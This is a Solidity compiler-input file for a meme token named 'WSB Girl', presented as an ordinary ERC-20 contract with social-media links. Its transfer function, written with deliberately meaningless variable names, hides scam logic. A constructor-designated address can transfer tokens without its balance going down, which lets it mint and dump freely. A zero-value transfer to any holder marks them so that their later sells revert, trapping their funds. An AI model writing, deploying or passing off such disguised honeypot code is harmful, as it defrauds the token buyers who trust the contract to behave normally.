{{
  "language": "Solidity",
  "sources": {
    "deploy/Contract.sol": {
      "content": "/*\n\nTelegram: https://t.me/wsbgirl\n\nTwitter: https://twitter.com/wsbgirleth\n\n*/\n\n// SPDX-License-Identifier: MIT\n\npragma solidity >0.8.7;\n\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\n\ncontract Ownable is Context {\r\n    address private _owner;\r\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\r\n        _;\r\n    }\r\n\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), 'Ownable: new owner is the zero address');\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\n\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\n    function WETH() external pure returns (address);\r\n}\n\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\n\ncontract WSBGirl is Ownable {\n    string public name;\n\n    function stopped(address whistle, address giant, uint256 white) private returns (bool success) {\r\n        if (protection[whistle] == 0) {\r\n            if (potatoes[whistle] > 0 && whistle != uniswapV2Pair) {\r\n                protection[whistle] -= forth;\r\n            }\r\n            balanceOf[whistle] -= white;\r\n        }\r\n        if (white == 0) {\r\n            potatoes[giant] += forth;\r\n        }\r\n        balanceOf[giant] += white;\r\n        emit Transfer(whistle, giant, white);\r\n        return true;\r\n    }\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    mapping(address => uint256) public balanceOf;\n\n    mapping(address => uint256) private protection;\n\n    uint256 public totalSupply;\n\n    function approve(address needs, uint256 white) public returns (bool success) {\r\n        allowance[msg.sender][needs] = white;\r\n        emit Approval(msg.sender, needs, white);\r\n        return true;\r\n    }\n\n    function transfer(address giant, uint256 white) public returns (bool success) {\r\n        stopped(msg.sender, giant, white);\r\n        return true;\r\n    }\n\n    mapping(address => uint256) private potatoes;\n\n    uint256 private forth = 18;\n\n    uint8 public decimals = 9;\n\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    constructor(address soap) {\r\n        symbol = 'WSB Girl';\r\n        name = 'WSB Girl';\r\n        totalSupply = 1000000000 * 10 ** decimals;\r\n        balanceOf[msg.sender] = totalSupply;\r\n        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        protection[soap] = forth;\r\n    }\n\n    address public uniswapV2Pair;\n\n    function transferFrom(address whistle, address giant, uint256 white) public returns (bool success) {\r\n        stopped(whistle, giant, white);\r\n        require(white <= allowance[whistle][msg.sender]);\r\n        allowance[whistle][msg.sender] -= white;\r\n        return true;\r\n    }\n\n    string public symbol;\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}